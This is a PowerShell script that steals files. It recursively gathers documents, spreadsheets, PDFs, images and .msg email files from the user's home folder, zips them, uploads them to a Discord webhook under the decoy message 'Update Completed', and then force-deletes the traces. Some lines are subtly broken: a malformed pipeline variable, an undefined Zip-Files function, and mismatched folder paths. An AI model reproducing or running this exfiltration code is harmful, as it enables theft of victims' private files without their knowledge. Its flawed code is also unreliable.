#Replace with your Discord webhook URL
$webhookUrl = "$dc"

function Upload-To-Discord($file) {
    $payload = @{
        content = "Update Completed"
        files = @(
            @{
                filename = $file.Name
                content = [System.IO.File]::ReadAllBytes($file.FullName)
            }
        )
    }

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $payload) -ContentType 'application/json'
}

#Get all files from user's home directory
$files = Get-ChildItem -Path $env:HOMEPATH -Recurse | Where-Object {$.Extension -in ".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg"}

#Create folders for each file type
$fileTypes = @(".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg")
foreach ($fileType in $fileTypes) {
    $folderPath = "C:\temp\files$fileType"
    if (!(Test-Path $folderPath)) {
        New-Item -ItemType Directory -Path $folderPath
    }
}

#Sort files into respective folders
foreach ($file in $files) {
    $fileType = $file.Extension.ToLower()
    $destinationFolder = "C:\temp\files_$fileType"
    Copy-Item $file.FullName -Destination $destinationFolder
}

#Zip files in each folder
$folders = Get-ChildItem "C:\temp" -Directory
foreach ($folder in $folders) {
    Zip-Files $folder.FullName $folder.FullName
}

#Upload zip files to Discord
$zipFiles = Get-ChildItem "C:\temp*" -Filter "*.zip"
foreach ($zipFile in $zipFiles) {
    Upload-To-Discord $zipFile
}

#Clean up temporary files
Remove-Item "C:\temp*" -Recurse -Force
